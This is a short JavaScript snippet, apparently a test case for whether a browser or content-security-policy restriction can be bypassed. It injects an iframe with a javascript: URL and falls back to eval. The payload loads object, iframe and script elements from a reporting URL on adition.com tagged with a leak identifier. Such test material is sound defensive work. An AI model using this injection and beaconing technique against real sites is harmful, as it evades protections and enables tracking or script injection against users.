(function(){

		var payload = `
			top.SUCCESS = true;

			var o = document.createElement("object");
			o.data = \`https://adition.com/report/?leak=c1064676-object\`;
			document.body.appendChild(o);

			var i = document.createElement("iframe");
			i.src = \`https://adition.com/report/?leak=c1064676-iframe\`;
			document.body.appendChild(i);

			var s = document.createElement("script");
			s.src = \`https://adition.com/report/?leak=c1064676-script\`;
			document.body.appendChild(s);
		`;

		document.body.innerHTML+="<iframe id='XXX' src='javascript:" + payload +"'></iframe>";
		setTimeout(function() {
				if (!top.SUCCESS) {
						XXX.contentWindow.eval(payload);
				}
		}, 500);

}())